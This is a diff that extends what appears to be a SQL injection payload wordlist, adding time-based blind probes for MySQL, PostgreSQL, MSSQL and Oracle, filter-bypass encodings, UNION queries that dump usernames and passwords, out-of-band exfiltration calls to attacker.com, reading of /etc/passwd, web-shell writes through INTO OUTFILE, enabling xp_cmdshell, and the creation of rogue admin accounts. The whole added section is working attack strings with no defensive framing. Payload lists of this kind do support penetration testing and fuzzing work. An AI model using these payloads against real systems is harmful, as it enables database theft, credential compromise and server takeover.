@@ -84,3 +84,197 @@ admin'/*
 {"$where": "sleep(5000)"}
 ' || '1'=='1
 admin' || 'a'=='a
+
+# Advanced time-based blind SQL injection
+# MySQL advanced
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT SLEEP(5) FROM information_schema.tables LIMIT 1)--
+' UNION SELECT IF(1=1,SLEEP(5),0)--
+' AND IF(1=1,SLEEP(5),0)--
+' OR IF(SUBSTRING(@@version,1,1)='5',SLEEP(5),0)--
+
+# PostgreSQL advanced
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+'; SELECT pg_sleep(5) WHERE 1=1--
+' AND 1=(SELECT COUNT(*) FROM generate_series(1,1000000))--
+
+# MSSQL advanced
+'; IF (1=1) WAITFOR DELAY '0:0:5'--
+'; IF (SELECT USER) = 'sa' WAITFOR DELAY '0:0:10'--
+' AND (SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3)>0--
+
+# Oracle advanced
+' AND 1=(SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)--
+' AND (SELECT UTL_INADDR.get_host_name('127.0.0.1') FROM dual) IS NOT NULL--
+' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual) IS NULL--
+
+# WAF/Filter bypass techniques
+# Space bypass
+' OR '1'='1'--
+'OR'1'='1'--
+'OR'1'='1
+'%09OR%091=1--  # Tab
+'%0AOR%0A1=1--  # New line
+'%0DOR%0D1=1--  # Carriage return
+'/**/OR/**/1=1--
+
+# Comment bypass
+'/*!OR*/1=1--
+'/*! OR */1=1--
+'/*!50000OR*/1=1--
+'/*!12345OR*/1=1--
+
+# Case variation bypass
+' Or '1'='1'--
+' oR '1'='1'--
+' OR '1'='1'--
+' UnIoN SeLeCt--
+
+# Alternative operators
+' || '1'='1'--
+' && 1=1--
+' | 1=1--
+' & 1=1--
+
+# Encoding bypass
+%27%20OR%201=1--
+%27%20%4F%52%20%31%3D%31--
+' %4F%52 1=1--
+\' OR 1=1--
+%5C%27 OR 1=1--
+
+# String concatenation bypass
+# MySQL
+'||' (SELECT 'x')='x
+' OR CONCAT('a','a')='aa'--
+
+# MSSQL
+' OR 'a'+'a'='aa'--
+' OR 'a'||'a'='aa'--
+
+# Oracle
+' OR 'a'||'a'='aa'--
+' OR CONCAT('a','a')='aa'--
+
+# PostgreSQL
+' OR 'a'||'a'='aa'--
+
+# Obfuscation techniques
+' OR 1=1%00--
+' OR 1=1%20--
+' OR 1=1;%00
+' OR 1=1;%20
+' OR 1=1/*foo*/--
+' OR 1=1#%0A
+
+# Hex encoding
+0x61646D696E  # admin
+0x27206F72202731273D2731  # ' or '1'='1
+
+# Char function
+CHAR(39) OR CHAR(49)=CHAR(49)  # ' OR '1'='1
+' OR CHR(49)=CHR(49)--  # Oracle/PostgreSQL
+' OR ASCII(49)=49--
+
+# Advanced UNION attacks
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' UNION SELECT username,password FROM users--
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT user(),database(),version()--
+
+# Out-of-band exploitation
+# DNS exfiltration (MySQL)
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.attacker.com\\a')))--
+
+# Oracle UTL_HTTP
+' AND (SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual)--
+
+# MSSQL xp_dirtree
+'; EXEC master..xp_dirtree '\\attacker.com\a'--
+
+# Error-based data extraction
+# MySQL
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
+' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT @@version)))--
+' AND UPDATEXML(1,CONCAT(0x5c,(SELECT @@version)),1)--
+
+# MSSQL
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CAST((SELECT @@version) AS int)--
+
+# PostgreSQL
+' AND 1=CAST((SELECT version()) AS numeric)--
+
+# Oracle
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+
+# Second-order SQL injection
+username: admin'--
+password: anything
+
+# JSON-based SQL injection
+{"username":"admin' OR '1'='1","password":"x"}
+{"id":"1' UNION SELECT NULL--"}
+
+# XML-based SQL injection
+<user><name>admin' OR '1'='1</name></user>
+
+# LDAP + SQL combined
+*)(uid=*))(&(uid=admin' OR '1'='1
+
+# Cookie-based SQL injection
+Cookie: id=1' OR '1'='1--
+
+# HTTP Header injection
+User-Agent: ' OR '1'='1--
+Referer: ' OR '1'='1--
+X-Forwarded-For: ' OR '1'='1--
+
+# Routed SQL injection (through application)
+/?search=x' AND (SELECT * FROM users WHERE username='admin')--
+
+# Advanced boolean-based blind
+' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
+' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users LIMIT 1)>100--
+' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--
+
+# Bitwise operations
+' AND (SELECT @@version)&1--
+' AND (SELECT 1)^1=0--
+
+# String functions exploitation
+' AND (SELECT REVERSE('olleh'))='hello'--
+' AND (SELECT REPLACE('test','t','x'))='xesx'--
+' AND (SELECT SUBSTRING('hello',1,1))='h'--
+
+# Database enumeration
+' UNION SELECT schema_name,NULL FROM information_schema.schemata--
+' UNION SELECT table_name,table_schema FROM information_schema.tables--
+' UNION SELECT column_name,table_name FROM information_schema.columns--
+
+# Privilege escalation attempts
+'; GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%'--
+'; ALTER USER 'root'@'localhost' IDENTIFIED BY 'hacked'--
+'; CREATE USER attacker IDENTIFIED BY 'pass123'--
+
+# File operations
+# MySQL
+' UNION SELECT LOAD_FILE('/etc/passwd')--
+' INTO OUTFILE '/var/www/html/shell.php'--
+' INTO DUMPFILE '/var/www/html/shell.php'--
+
+# PostgreSQL
+'; COPY (SELECT '') TO '/tmp/output.txt'--
+
+# MSSQL
+'; EXEC xp_cmdshell 'dir'--
+'; EXEC sp_configure 'xp_cmdshell',1--
+
+# Conditional responses
+' AND IF(1=1,1,(SELECT 1 UNION SELECT 2))--
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END--
+
+# Mass assignment attacks via SQL
+' UPDATE users SET role='admin' WHERE username='attacker'--
+' INSERT INTO users (username,role) VALUES ('attacker','admin')--
